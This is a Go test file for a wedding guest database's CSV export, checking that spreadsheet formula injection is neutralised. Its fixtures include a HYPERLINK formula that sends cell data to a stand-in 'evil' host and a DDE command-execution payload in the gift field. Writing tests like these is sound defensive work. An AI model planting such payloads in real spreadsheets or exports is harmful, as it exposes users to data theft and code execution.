package services

import (
	"bytes"
	"encoding/csv"
	"slices"
	"testing"

	"weddingdb/internal/models"

	"github.com/google/uuid"
)

func TestCSVText(t *testing.T) {
	cases := map[string]string{
		"":                         "",
		"Alice":                    "Alice",
		"=HYPERLINK(\"http://x\")": "'=HYPERLINK(\"http://x\")",
		"+60123":                   "'+60123",
		"-2+3":                     "'-2+3",
		"@SUM(A1)":                 "'@SUM(A1)",
		"\t=1":                     "'\t=1",
		"\r=1":                     "'\r=1",
		"a=1":                      "a=1",
		"陈 =1":                     "陈 =1",
	}
	for in, want := range cases {
		if got := csvText(in); got != want {
			t.Errorf("csvText(%q) = %q, want %q", in, got, want)
		}
	}
}

// TestWriteCSV_NeutralisesFormulas drives the real writer: guest name, table
// name and gift item all carry formula payloads and must come out as text.
func TestWriteCSV_NeutralisesFormulas(t *testing.T) {
	svc := &ReportService{}
	tid := uuid.New()
	guests := []models.GuestRecord{{
		Name:      `=HYPERLINK("http://evil/?d="&A2,"x")`,
		TableID:   &tid,
		SeatNum:   intPtr(1),
		AngbaoAmt: intPtr(100),
		GiftItem:  strPtr("@cmd|' /C calc'!A0"),
	}}
	rows, summary := svc.buildRows(guests, map[uuid.UUID]string{tid: "+Table"})

	data, err := svc.writeCSV(rows, summary)
	if err != nil {
		t.Fatalf("writeCSV: %v", err)
	}
	if !bytes.HasPrefix(data, []byte("\xEF\xBB\xBF")) {
		t.Error("CSV must start with a UTF-8 BOM so Excel reads Chinese names")
	}
	r := csv.NewReader(bytes.NewReader(data))
	r.FieldsPerRecord = -1
	records, err := r.ReadAll()
	if err != nil {
		t.Fatalf("parse CSV: %v", err)
	}

	for _, rec := range records {
		for _, cell := range rec {
			if cell != "" && slices.Contains([]byte("=+-@\t\r"), cell[0]) {
				t.Errorf("cell %q starts with a formula trigger", cell)
			}
		}
	}
	if got, want := records[1][0], `'=HYPERLINK("http://evil/?d="&A2,"x")`; got != want {
		t.Errorf("guest name cell = %q, want %q", got, want)
	}
}
